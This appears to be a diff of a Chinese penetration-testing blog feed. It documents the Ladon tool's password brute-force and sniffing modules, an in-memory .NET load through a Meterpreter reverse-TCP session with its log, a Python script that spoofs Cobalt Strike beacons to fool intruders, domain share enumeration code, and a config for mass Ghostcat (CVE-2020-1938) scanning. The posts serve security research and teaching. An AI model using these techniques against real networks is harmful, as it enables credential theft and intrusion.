-<td>更新</td>
-<td>OsScan</td>
-<td>扫描速度优化(某项目批量C段不再卡死)</td>
-</tr>
-<tr>
-<td>更新</td>
-<td>WmiScan</td>
-<td>135端口关闭或RPC不可用停止爆破</td>
-</tr>
-<tr>
-<td>更新</td>
-<td>SmbScan</td>
-<td>445端口关闭停止爆破(功能完美代替IpcScan，只是需使用DLL)</td>
-</tr>
-<tr>
-<td>移除</td>
-<td>IPCScan</td>
-<td>速度慢以及批量可能存在误报将其移除，反正SmbScan完全替代</td>
-</tr>
-<tr>
-<td>更新</td>
-<td>所有模块</td>
-<td>所有功能模块参数忽略大小写</td>
-</tr>
-</tbody></table>
-<h3 id="LdapScan-AD域服务器密码爆破"><a href="#LdapScan-AD域服务器密码爆破" class="headerlink" title="LdapScan AD域服务器密码爆破"></a>LdapScan AD域服务器密码爆破</h3><p>非域内机器也可破解跨网段AD域服务器，LDAP端口为389<br>注意非3389，即便跑出来的密码能登远程桌面也没半毛钱关系<br>还有WMI、SMB(IPC)跑出来的密码也一样，3389是RDP协议<br>WMI端口135，SMB端口445，不要以为能登3389一定能IPC连接<br>有时一个帐密各种协议方法都能连到远程机器只能说运气好<br>不要说这个密码3389可以登，但是WMI或SMB跑不出来，瞎搞<br>默认条件下都不能保证100%，更何况经过配置或出问题的系统<br><img alt="LdapScan" data-original="http://k8gege.org/k8img/Ladon/exe/LdapScan_6.0.gif"></p>
-<h3 id="FtpSniffer-FTP密码嗅探"><a href="#FtpSniffer-FTP密码嗅探" class="headerlink" title="FtpSniffer FTP密码嗅探"></a>FtpSniffer FTP密码嗅探</h3><p>支持两种写法: FtpSniffer/SnifferFtp<br>Example: Ladon FtpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="FtpSniffer" data-original="http://k8gege.org/k8img/Ladon/exe/FtpSniffer.PNG"></p>
-<h3 id="HttpSniffer-HTTP密码嗅探"><a href="#HttpSniffer-HTTP密码嗅探" class="headerlink" title="HttpSniffer HTTP密码嗅探"></a>HttpSniffer HTTP密码嗅探</h3><p>支持两种写法: HttpSniffer/SnifferHTTP<br>Example: Ladon HttpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="HttpSniffer" data-original="http://k8gege.org/k8img/Ladon/exe/HttpSniffer.PNG"></p>
-<h3 id="Sniffer-网络嗅探"><a href="#Sniffer-网络嗅探" class="headerlink" title="Sniffer 网络嗅探"></a>Sniffer 网络嗅探</h3><p>基于Socket RAW嗅探，无需安装Winpcap，但需管理员权限<br>主要用于发现内网存活机器或嗅探管理员登陆FTP或WEB站点密码<br>后续可能会添加其它功能可能另外写个专门用于嗅探的工具</p>
-<p>PS: 目前网上大部嗅探工具都是基于Winpcap抓包，某些机器针对其做限制，会提示找不到网卡无法嗅探。<br>重点是不少程序不是GUI就是只能在Linux下用，如果你用py的SCAPY(需winpcap)来实现发现程序高达48M<br>当然也可用于发现恶意木马上线地址(如Cobal strike默认一分钟才发包的netstat不一定看得到)</p>
-<p>Example: Ladon HttpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="Sniffer" data-original="http://k8gege.org/k8img/Ladon/exe/Sniffer.PNG"></p>
-<h3 id="EnumIIS-IIS站点密码读取"><a href="#EnumIIS-IIS站点密码读取" class="headerlink" title="EnumIIS IIS站点密码读取"></a>EnumIIS IIS站点密码读取</h3><p>获取IIS站点、路径、帐号、密码<br><img alt="EnumIIS" data-original="http://k8gege.org/k8img/Ladon/exe/EnumIIS.PNG"></p>
-<h3 id="EnumProcess-进程详细信息获取"><a href="#EnumProcess-进程详细信息获取" class="headerlink" title="EnumProcess 进程详细信息获取"></a>EnumProcess 进程详细信息获取</h3><p>支持三种写法: EnumProcess/ProcessList/tasklist<br>结果(PID、Session、位数、进程名、用户名、路径、标题)<br><img alt="EnumProcess" data-original="http://k8gege.org/k8img/Ladon/exe/EnumProcess.PNG"></p>
-<h3 id="GetCmdLine-进程启动参数"><a href="#GetCmdLine-进程启动参数" class="headerlink" title="GetCmdLine 进程启动参数"></a>GetCmdLine 进程启动参数</h3><p>进程启动参数/可指定进程<br>支持2种写法: GetCmdLine/CmdLine<br><img alt="getcmdline" data-original="http://k8gege.org/k8img/Ladon/exe/getcmdline.PNG"></p>
-<h3 id="GetInfo-获取渗透基础信息"><a href="#GetInfo-获取渗透基础信息" class="headerlink" title="GetInfo 获取渗透基础信息"></a>GetInfo 获取渗透基础信息</h3><p>获取渗透基础信息（IP、域信息、系统信息、软件信息、网络连接、补丁信息、用户等）<br>GetInfo2 包含GetInfo &amp; Wmi获取的相关信息</p>
-<h3 id="全部功能"><a href="#全部功能" class="headerlink" title="全部功能"></a>全部功能</h3><p><a href="http://k8gege.org/p/648af4b3.html">http://k8gege.org/p/648af4b3.html</a></p>
-<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
-]]></content>
-      <categories>
-        <category>工具</category>
-        <category>Ladon</category>
-        <category>密码</category>
-        <category>嗅探</category>
-      </categories>
-      <tags>
-        <tag>Ladon</tag>
-        <tag>Tool</tag>
-        <tag>Sniffer</tag>
-        <tag>FtpSniffer</tag>
-        <tag>HttpSniffer</tag>
-        <tag>IIS</tag>
-        <tag>LDAP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Metasploit/PowerShell内存加载执行.NET</title>
-    <url>/p/57438.html</url>
-    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>随着XP和2003退出Windows系统，.NET与PowerShell在渗透中将会更吃香，<br>虽然.NET和PowerShell可以相互调用但PowerShell的兼容性远不如.NET，<br>且想要执行PowerShell，前提也需要.net环境，效率方面也是程序比脚本强<br>同样都可内存加载，为何非要鼓吹PowerShell呢，很多PowerShell框架或模块，<br>兼容性和稳定性并不好都没人说，好了不扯太远，下面我们来看一下如何使用<br>MSF中Meterpreter的powershell模块在内存中执行.NET程序集。</p>
-<h3 id="0x001-C-DLL"><a href="#0x001-C-DLL" class="headerlink" title="0x001 C# DLL"></a>0x001 C# DLL</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">namespace msftest</span><br><span class="line">&#123;</span><br><span class="line">    public class msf</span><br><span class="line">    &#123;</span><br><span class="line">        public static string run()</span><br><span class="line">        &#123;</span><br><span class="line">            return &quot;msftest by k8gege&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x002-PowerShell"><a href="#0x002-PowerShell" class="headerlink" title="0x002 PowerShell"></a>0x002 PowerShell</h3><p>首先我们先通过系统自带PowerShell执行DLL，看DLL功能是否正常。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">Reflection.Assembly</span>]::LoadFile(<span class="string">"C:\Users\k8gege\msftest.dll"</span>)</span><br><span class="line"></span><br><span class="line">GAC    Version        Location</span><br><span class="line">---    -------        --------</span><br><span class="line">False  v2.<span class="number">0.50727</span>     C:\Users\k8gege\\msftest.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">msftest.msf</span>]::run()</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x003-MSF加载-NET"><a href="#0x003-MSF加载-NET" class="headerlink" title="0x003 MSF加载.NET"></a>0x003 MSF加载.NET</h3><p>将DLL复制至MSF服务器,使用Meterpreter的powershell模块在内存中执行DLL</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:443 </span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.61:443 -&gt; 192.168.1.5:54647) at 2019-12-19 20:36:14 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; load powershell</span><br><span class="line">Loading extension powershell...Success.</span><br><span class="line">meterpreter &gt; powershell_import msftest.dll</span><br><span class="line">[+] File successfully imported. No result was returned.</span><br><span class="line">meterpreter &gt; powershell_execute <span class="string">"[msftest.msf]::run()"</span></span><br><span class="line">[+] Command execution completed:</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x004-关于兼容性"><a href="#0x004-关于兼容性" class="headerlink" title="0x004 关于兼容性"></a>0x004 关于兼容性</h3><p>1.MSF中的powershell模块稳定性和兼容性并不好，K8在两台WIN7中测试<br>有一台刚加载powershell模块，MET就崩溃导致权限丢失（而且还弹框）<br>再者某些程序集和PowerShell脚本也不能正常加载，有些功能也会失效。<br>这一点Cobalt Strike做得比较好，对.net和PowerShell兼容性80%吧，<br>.NET加载功能好比虚拟机加载操作系统，CS无法执行部分.NET函数很正常<br>正如Ladon在CS下执行，部分功能直接不可用，部分功能执行还有问题。<br>有些人可能说是Ladon的问题，当然说得也没错，但没想过CS的问题吗<br>它提供.NET程序执行的功能,只是使用了几个微软API接口，并不完全<br>试想一下被微软收购做了10几年.NET跨平台的MONO也不能保证100%兼容<br>CS确实是非常强大我承认(不然不使用)，但强大并不等于它就没有问题<br>它的缺点和优点一样，非常多，你用久了懂在理懂的功能多了就会发现<br>MONO那么大都不能保证完全兼容.NET，CS区区几行代码能完全兼容吗?</p>
-<p>我上面说的Ladon在CS下有问题，说Ladon也有问题没错，是因为我认为<br>写一个好的渗透工具，应尽量兼容各种环境。不过CS也只是使用的工具，<br>还不是目标环境，要是连工具自身有BUG的模块都能完全兼容，就是完美。</p>
-<p>目前Ladon有几个模块不兼容CS，在CNA脚本里有注明，用前必看。其它模块<br>可能在CS下使用远不如EXE好用，特别是那些没把时间改成3秒内的，默认60秒<br>才有回显，说成是Ladon扫描慢(即便改成0秒也慢)，因为CS无法完美快速回显。<br>看看CS自带的简单端口扫描或其它扫描，光扫几台机器，CS的回显就很慢吧。<br>何况Ladon还是外置插件，如Ladon扫描百度子域名很快，但在CS下回显很慢，<br>并不是Ladon扫得慢，好比把水管前面接一根吸管，要装满一桶水，能快吗。<br>Ladon扫描很快如同水管，但CS回显如同吸管，水管里的水再快也会因吸管变慢。</p>
-<p>2.powershell模块也支持EXE程序，但需要把.exe改成.dll后缀才能加载。<br>因为通过powershell加载，如果通过系统本身的PowerShell加载都不正常，<br>MSF加载也会失败，因为MSF并不是虚拟一个.NET加载功能。</p>
-<p>如下所示，有时通过系统PowerShell加载ex一样报错<br>PS C:\Users\k8gege&gt; [Reflection.Assembly]::LoadFile(“C:\Users\k8gege\test.exe”)<br>使用“1”个参数调用“LoadFile”时发生异常:“生成此程序集的运行时比当前加载的运<br>行时新,无法加载此程序集。 (异常来自 HRESULT:0x8013101B)”<br>所在位置 行:1 字符: 32</p>
-<ul>
-<li>[Reflection.Assembly]::LoadFile &lt;&lt;&lt;&lt; (“C:\Users\k8gege\test.exe”)<ul>
-<li>CategoryInfo          : NotSpecified: (:) [], MethodInvocationException</li>
-<li>FullyQualifiedErrorId : DotNetMethodException</li>
-</ul>
-</li>
-</ul>
-<h3 id="0x005-结论"><a href="#0x005-结论" class="headerlink" title="0x005 结论"></a>0x005 结论</h3><p>虽然本文介绍了通过MSF加载执行.NET程序的方法，但是从兼容性以及稳定性来看<br>目前在实战中还是慎用为好，以免因为弹框或崩溃导致权限丢失。不能因为MSF强大<br>而无脑使用它的所有功能，程序强大并不代表所有功能模块都稳定好用。只需要使用<br>稳定好用的模块功能即可，其它模块可以等作者更新稳定后再使用。</p>
-<p>注意：我这里说的是不推荐用MSF中的PowerShell加载模块，并不是说MSF。<br>如同说霍金身体残废，但却没有说他是废人哦，何况只是说他一只手受伤。</p>
-]]></content>
-      <categories>
-        <category>Metasploit</category>
-        <category>.NET</category>
-        <category>PowerShell</category>
-      </categories>
-      <tags>
-        <tag>Metasploit</tag>
-        <tag>PowerShell</tag>
-        <tag>.NET</tag>
-        <tag>C#</tag>
-        <tag>MSF</tag>
-        <tag>meterpreter</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>看我如何模拟Cobalt Strike上线欺骗入侵者</title>
-    <url>/p/40523.html</url>
-    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>不知道你有没有遇到过马上线却不能操作的情况，我猜当你网络卡或马写得不好时会出现这个问题<br>但是人为的你可能没遇到过，首先要欺骗你的远控，得分析你的协议，如果你的马根本不是公开的<br>网络又是好的，你刚往人家机器里种马，发现马只能上线不能操作，绝对是马有问题，不能甩锅我<br>人家都不知道你的马的通信原理，流量特征，不可能事先准备好一个程序，让你一发就欺骗你的马<br>本文主要研究CS这个APT很喜欢用的马，当然TCP的也一样原理，只要构造对应的数据包就可欺骗</p>
-<h3 id="远控术语"><a href="#远控术语" class="headerlink" title="远控术语"></a>远控术语</h3><p>Cobalt Strike采用的是B/S架构，也就是常说的HTTP协议（HTTPS加密的http，记住都是WEB就不会错了）<br>Client：客户是上帝，我们想买什么告诉服务员。就是控制端，即通过它来控制对方电脑。不叫服务端哦<br>Server：服务员，即服务端。以前常说的肉鸡，这个叫被控端不是控制端，叫做什么就做什么不就是服务？<br>中转：放在VPS，好比现在的快递，可有可无，买家直接见卖家就不需要。CS中转Teamserve就是一个WEB</p>
-<p>就是说如果你用IIS或Tomcat搭建的ASP、JSP、PHP、.NET等网站也可以做为中转，即可实现HTTP远控<br>如果CS不搞客户端，我们便可直接在浏览器上操作和控制目标机器，这就是08年这类码称为B/S架构的原因<br>CS的客户端就像我们用PY或其它语言实现模拟WEB登陆网站来操作一样，中转是WEB，那么肉鸡上线，它也<br>一样是HTTP请求来实现，WEB发包、POST提交不管怎么表达都可以，这是渗透基础，即是CS通信采用HTTP</p>
-<p>C/S架构：Clinet/Server,主要指的是TCP，客户端和服务端，即便带个中转它也还是叫CS架构<br>B/S架构: Browser/Server,主要是HTTP，无论直接通过浏览器操作，还是像CS加个中转再用客户端访问<br>RAT：Remote Admin Tools，远程管理工具，长期以来国内外通用叫法。<br>C2: 老外的新名词，command&amp;control，从字面上就很好理解命令和控制，不管任何协议马都可这样叫<br>这种叫法对于不够专业的人来说不会错，因为他根本不需要了解远控到底用什么协议实现，反正都叫C2</p>
-<p>当然无论是以前还是现在叫RAT也绝对不会错，叫RAT可能更专业一点，RAT像老戏骨，C2像小鲜肉<br>看看现在好多远控基本都有CMD和文件管理，甚至只是一个SHELL而已了，我猜这就是C2的由来吧<br>以前像这样一般只称为后门，随便找一个远控都有CMD、文件管理、屏幕控制、键盘记录等功能<br>而现在一个CMD和文件管理，在10几年前也很难称为马叫炮灰，现在搞个炮灰一堆BUG还以为很吊<br>以前只能称为后门，连远控都称不上的，现在只实现了一个CMD执行命令，就说成自己写个远控了<br>多台机器管理实现不了先不说，只能一对一，断以后就无法控制，连后门都不合格，还TM说成远控</p>
-<p>PS：之所以写这一段话，主要是发现不少写马的或渗透的，竟然都分不清楚服务端和控制端</p>
-<h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><p>还有我说HTTP协议(含HTTP/S)，还有人说不是HTTP还有HTTPS（首先搞清楚HTTPS是什么，加密的HTTP）<br>比方说你设计一个HTTP经过特定格式加密，单纯HTTP访问得不到真实数据而已，解不了就不属于HTTP了？<br>当有一天大家都觉得这个加密好用或安全，给它起个名叫KTTPS，或许可称为新协议，但本质还是HTTP协议。<br>当然可能有些人要说HTTP也属于TCP，虽说HTTP可通过TCP实现，但是两者有很大区别，通过TCP实现叫伪<br>为什么因为它不是真正的HTTP，目标WAF禁TCP的时候，TCP实现的就出不来，HTTP只要会操作WEB就行<br>HTTP比TCP多了一个，允许通过WEB操作来访问，HTTP虽是特殊的TCP，但已经完全变异成了一个新协议。</p>
-<p>就像猩猩和人，我们几乎不会说人是猩猩，只会说人是猩猩进化而来的，因为变异太多，可以以新物种定义。<br>而HTTPS和HTTP，就像戴不戴口罩，戴个口罩就TM不是人了？除了戴个口罩，你的衣食住行哪一样不是人。<br>你不戴口罩进不了小区，那你就戴口罩就能进去了啊，就像HTTPS(HTTP基础上加SSL协议就可以访问了啊)<br>HTTP不加SSL访问不了HTTPS，你就说HTTPS不属于HTTP，这和不戴口罩不让进小区，就说你不是人一样<br>本质是因为你不是人而不让你进吗？而是你不戴口罩，并不是说你不是人所以不让你出入，概念不一样。<br>所以说我们通常只说TCP协议、HTTP协议(因为已包含HTTPS在内)，至少10几年来很少听到有人说HTTPS马<br>最多只是听说这款http马也支持https，或这个webshell工具支持https站点，这个EXP支持HTTPS站点等</p>
-<h3 id="CS心跳包"><a href="#CS心跳包" class="headerlink" title="CS心跳包"></a>CS心跳包</h3><p>一般在设计远控时，我们都会对机器进行标记，比如上线特征为A<br>A对应信息已保存在本地数据库，因此想要确认机器是否还在控<br>我们只需要发送A标识给客户端，告诉它机器还在控制,即心跳包<br>而没实战过的人是每次都发送目标信息，这样很容易被目标发现</p>
-<p>下面配置好CS让其上线后，我们对服务端进行抓包，其心跳包如下<br>CS也是一样，因为是BS模式HTTP协议，它的心跳特征存在Cookie里<br>非正常cookie写法，一段很长的加密数据，可以止来判断是否中招</p>
-<p><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat1.PNG"></p>
-<h3 id="上线验证"><a href="#上线验证" class="headerlink" title="上线验证"></a>上线验证</h3><p>使用Ladon Exp生成器可以提交WEB数据包，类似Firefox上的HackBar但更高级<br>区别在于可生成Ladon插件或独立EXE，对于不懂编程的人来说也可“编写”EXP<br><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat2.PNG"></p>
-<p>运行LadonPoc.exe发现CS上线，执行一次就上线一次，说明思路没错<br><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat3.gif"></p>
-<h3 id="欺骗入侵者"><a href="#欺骗入侵者" class="headerlink" title="欺骗入侵者"></a>欺骗入侵者</h3><p>假设我们在内网中发现别人的CS流量或者抓到样本，给他模拟上线，让他有得看没得吃<br>他在客户端那边只会看到机器在线，就是死活控不了，然后他就想是不是目标环境奇葩<br>还是说网络太卡或有什么问题,能上线就是不能操作，哈哈，一直在上线却啥事也不能做</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">### Cobalt Strike Cheat by K8gege</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cscheat</span><span class="params">()</span>:</span></span><br><span class="line">	opener = urllib2.build_opener()</span><br><span class="line">	opener.addheaders.append((<span class="string">'Cookie'</span>, <span class="string">'Qk1UsVjTNpW6aR0327yD57Zkt1m6XWurvM+bR0xqOqGnXsatzGHpnccfgqmruH6dnJudEzijQhC0NCtoAxdA90rso7NAfBrfRrktO5B4FjZX6LEBxIyzEwQ71Jk1ttM8VY6luE5k+PMLk6DAmWUoGoJmvAl/qp4qreuWumv52TM='</span>))</span><br><span class="line">	res = opener.open(<span class="string">"http://192.168.1.102:800/dpixel"</span>)</span><br><span class="line">	content = res.read()</span><br><span class="line">	<span class="keyword">print</span> content</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:    </span><br><span class="line">	print(time.strftime(<span class="string">'%Y-%m-%d %X'</span>,time.localtime()))    </span><br><span class="line">	cscheat()</span><br><span class="line">	time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat4.gif"></p>
-<h3 id="读取CMD指令"><a href="#读取CMD指令" class="headerlink" title="读取CMD指令"></a>读取CMD指令</h3><p>当客户端下达CMD命令时，中转TeamServer会将命令放在心跳包中，返回的结果如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">^Zd........N...&amp;....%COMSPEC%.... /C net user k8gege..AAAAAAAAAA.&lt;....g..I9.....</span><br><span class="line"></span><br><span class="line">5e5a69740000002e0000004e000000260000000925434f4d535045432500000013202f43206e6574</span><br><span class="line">2075736572206b387465616d00004141414141414141414100e488fc2a22f737b0067ac4384c4971</span><br></pre></td></tr></table></figure>
-
-<p>测试多次发现不管执行多长的命令 都会出现/C空格 和两个00加至少一个A<br>所以我们截取 2F4320 和 000041 之间的值，再解密即为CS下发的CMD命令</p>
-<p><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat5.PNG"></p>
-<h3 id="返回CMD结果"><a href="#返回CMD结果" class="headerlink" title="返回CMD结果"></a>返回CMD结果</h3><p>将CS的命令执行结果提交到submit.php页面，即可实现回显,数据包如下</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /submit.php?id=60871 HTTP/1.1</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)</span><br><span class="line">Host: 192.168.1.102:800</span><br><span class="line">Content-Length: 68</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">...@...</span><br><span class="line">........win-60a3b595b7m\k8gege</span><br><span class="line">................0=W1..LGCN..</span><br></pre></td></tr></table></figure>
-
-<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>通过本文我们了解了CS心跳包机制、下达指令、回显等原理，并玩弄入侵者<br>有兴趣的话，可以自行抓包实现自己的CS服务端，甚至支持对Linux的控制<br>也可以实现CS远控的密罐，把CS下达的指令提取出来，返回假的CMD命令结果<br>即能收集目标证据以及意图，还能将他玩弄于鼓掌之中，搞死他，哈哈</p>
-<p>PS：之所以有这篇文章，是因为昨晚有人在群里讨论，CS能不能支不支持Linux<br>目前CS的shellcode以及beacon(核心功能DLL)都是WINDOWS系统才能执行。<br>而CS对于Linux的控制目前仅是SSH会话，想真正支持就得自己实现服务端<br>不要说让其支持Linux，用个GO来实现，兼容全平台都可以，只是很麻烦<br>因为不开源，每一个动作都要自己去分析它的数据包，很多功能也很费时<br>其实早在去年的这个时间就想实现Linux服务端，所以抓包研究了下。<br>当时就应该有这篇文章了，只是因为忙，懒得编辑文字，后面忘了发。</p>
-]]></content>
-      <categories>
-        <category>Cobalt Strike</category>
-      </categories>
-      <tags>
-        <tag>Cobalt Strike</tag>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>利用DirectoryEntry获取域内计算机以及共享资源</title>
-    <url>/p/54132.html</url>
-    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>System.DirectoryServices.DirectoryEntry组件提供了对Active Directory的访问。本文以两个简单的小程序为例，阐述了如何利用此组件查看网络的各节点的信息。 DirectoryEntry组件提供了Path属性，根据文档，此属性指定了目录服务中用来访问对象的对象名，其格式如下：<br>protocol://servername:port number/distinguished name<br>此语句的第一部分定义了访问将使用的协议，如<br>LDAP: (Lightweight Directory Access Protocol)<br>IIS: (提供IIS元数据来读及配置Internet Infomation Server)<br>WinNT: (提供在非常有限的性能下对Windows NT域的访问)<br>NDS: (提供对Novell Directory Service的访问)<br>等等（详细信息清参考MSDN）。 </p>
-<p>因此我们构造一个DirectoryEntry实例，将它的Path设为”WinNT:”，以通过对它的所有子项的枚举来发现网络上的所有域（以及工作组）。这样，再对所发现的域（以及工作组）的子项进行枚举，就可以发现网络上的所有计算机，结合WMI发现机器上的共享资源。</p>
-<h3 id="C-实现代码"><a href="#C-实现代码" class="headerlink" title="C#实现代码"></a>C#实现代码</h3><p>以下为Ladon的EnumShare代码,自动获取当前域，并枚举域内计算机以及获取机器开放共享资源。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string strDomain;</span><br><span class="line">string strComputer;</span><br><span class="line">string strShare;</span><br><span class="line">Console.WriteLine(&quot;Load EnumShare&quot;);</span><br><span class="line"></span><br><span class="line">DirectoryEntry root &#x3D; new DirectoryEntry(&quot;WinNT:&quot;);</span><br><span class="line">foreach (DirectoryEntry Domain in root.Children)</span><br><span class="line">&#123;</span><br><span class="line">    strDomain &#x3D; Domain.Name;</span><br><span class="line">    Console.WriteLine(&quot;Domain: &quot; + strDomain);</span><br><span class="line">    foreach (DirectoryEntry Computer in Domain.Children)</span><br><span class="line">    &#123;</span><br><span class="line">        if (Computer.SchemaClassName.Equals(&quot;Computer&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            strComputer &#x3D; Computer.Name;</span><br><span class="line">            ManagementObjectSearcher searcher &#x3D; new ManagementObjectSearcher(&quot;select * from win32_share&quot;);</span><br><span class="line">            foreach (ManagementObject share in searcher.Get())</span><br><span class="line">            &#123;</span><br><span class="line">                strShare &#x3D; share[&quot;Name&quot;].ToString();</span><br><span class="line">                Console.WriteLine(strComputer + &quot;\\&quot; + strShare);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Ladon EnumShare<br>因为崇尚极简主义，所以Ladon无需填写域名以及参数，参数多也很烦，全自动获取，一步到位。<br><img alt="img" data-original="https://k8gege.org/k8img/Ladon/exe/EnumShare.PNG"></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
-<p><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.directoryservices.directoryentry?view=netframework-4.8" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/api/system.directoryservices.directoryentry?view=netframework-4.8</a></p>
-]]></content>
-      <categories>
-        <category>Ladon</category>
-        <category>.NET</category>
-        <category>主机发现</category>
-        <category>源码</category>
-        <category>内网渗透</category>
-        <category>信息收集</category>
-        <category>编程</category>
-      </categories>
-      <tags>
-        <tag>Ladon</tag>
-        <tag>.NET</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ladon CVE-2020-1938跨网段、C段批量扫描内网漏洞</title>
-    <url>/p/42879.html</url>
-    <content><![CDATA[<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p>
-<h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>cnvd-2020-10487<br>cve-2020-1938</p>
-<h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p>开放AJP端口（默认开放8009）</p>
-<h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>apache tomcat 6<br>apache tomcat 7 &lt; 7.0.100<br>apache tomcat 8 &lt; 8.5.51<br>apache tomcat 9 &lt; 9.0.31</p>
-<h3 id="扫描框架"><a href="#扫描框架" class="headerlink" title="扫描框架"></a>扫描框架</h3><p>Ladon设计的初衷就是一个多线程扫描框架，主要是为了让使用者能快速批量检测企业内部或外部站点漏洞<br>不管你擅长哪一门语言，只需要实现单一功能，都可以快速进行批量IP、批量URL、批量C段、批量B段等等<br>每当公开或泄露一个新漏洞时，自己要实现多现程以及批量以上功能，重写一份浪费时间，可能会错过时机<br>小内网可能自己写个批量IP.TXT就够用了，但是大的内网几百几千个网段就基本没有工具考虑，如批量C段<br>但是不要慌，无论是多线程，还是批量C段、跨网段等等，Ladon全都帮你考虑好了，只需实现单一功能即可<br>在Ladon的插件中配置INI方式是不需要具备编程能力的，只要会使用工具，即可实现批量调用，非常简单</p>
-<h3 id="Ladon配置"><a href="#Ladon配置" class="headerlink" title="Ladon配置"></a>Ladon配置</h3><p>INI配置很简单，只需要两个参数即可。Github上随便找一份EXP，以下我用的是PYTHON版。<br>两种配置方式，一种是编译成EXE丢到目标上运行的，一种是PY脚本方式执行方便本地调式</p>
-<h4 id="EXE配置"><a href="#EXE配置" class="headerlink" title="EXE配置"></a>EXE配置</h4><p>cve-2020-1938.ini</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=CVE-2020-1938.exe</span><br><span class="line">arg=-p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>
-
-<h4 id="PY配置"><a href="#PY配置" class="headerlink" title="PY配置"></a>PY配置</h4><p>cve-2020-1938.ini</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=f:\python\python.exe</span><br><span class="line">arg=CVE-2020-1938.py -p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>
-
-<h3 id="批量内网"><a href="#批量内网" class="headerlink" title="批量内网"></a>批量内网</h3><p>把开放8009端口的IP放进ip.txt，执行以下命令即可批量扫描<br>当然也可以不扫端口和不扫存活IP，直接ip24.txt扫描批量C段</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon cve-2020-1938.ini</span><br></pre></td></tr></table></figure>
